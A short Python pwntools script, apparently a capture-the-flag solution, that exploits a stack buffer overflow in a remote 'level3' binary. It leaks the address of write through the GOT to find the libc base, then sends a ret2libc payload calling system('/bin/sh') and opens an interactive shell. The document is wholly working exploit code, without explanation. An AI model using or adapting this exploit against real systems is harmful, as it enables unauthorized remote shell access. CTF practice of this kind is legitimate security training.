#!/bin/sh/envy python
from pwn import *
sh = remote("pwn2.jarvisoj.com", 9879)
#sh = process("level3")
level3 = ELF("level3")
libc = ELF("./libc-2.19.so")
write_plt = level3.plt["write"]
write_got = level3.got["write"]
main_address = 0x08048484
#pause()
payload = "a" *0x88 + "bbbb" + p32(write_plt) + p32(main_address) + p32(1) + p32(write_got) + p32(0x4)
sh.sendlineafter("Input:\n",payload)
#print sh.recvuntil("Input:\n")

write_addr = u32(sh.recv()[0:4])
print "write_addr %x " % write_addr

libcbase = write_addr - libc.symbols["write"]
print "the libcbase is %x" % libcbase
sys_addr = libcbase + libc.symbols["system"]
bin_sh_addr = libcbase + list(libc.search("/bin/sh\0"))[0]

payload = 'a' * 0x88 + 'bbbb' + p32(sys_addr) + "dead" + p32(bin_sh_addr)
sh.sendline(payload)
sh.interactive()
